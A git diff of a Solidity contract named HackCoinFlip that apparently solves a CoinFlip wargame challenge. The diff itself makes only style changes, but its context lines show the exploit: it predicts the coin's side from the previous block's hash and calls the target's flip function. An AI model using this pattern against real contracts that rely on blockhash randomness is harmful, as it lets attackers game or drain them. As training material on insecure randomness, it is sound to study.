@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import '@openzeppelin/contracts/math/SafeMath.sol';
-import './coinflip.sol';
+import "@openzeppelin/contracts/math/SafeMath.sol";
+import "./coinflip.sol";
 
 /**
  * @title Hack CoinFlip
@@ -11,7 +11,7 @@ import './coinflip.sol';
  */
 contract HackCoinFlip {
     using SafeMath for uint256;
-    uint256 FACTOR =
+    uint256 private constant FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
     // @dev Original CoinFlip Contract
     CoinFlip private _coinFlipContract;
@@ -33,7 +33,7 @@ contract HackCoinFlip {
         uint256 blockValue = uint256(blockhash(block.number.sub(1)));
         uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
         bool side = coinFlip == 1 ? true : false;
-        
+
         //Call CoinFlip Contract
         _coinFlipContract.flip(side);
 
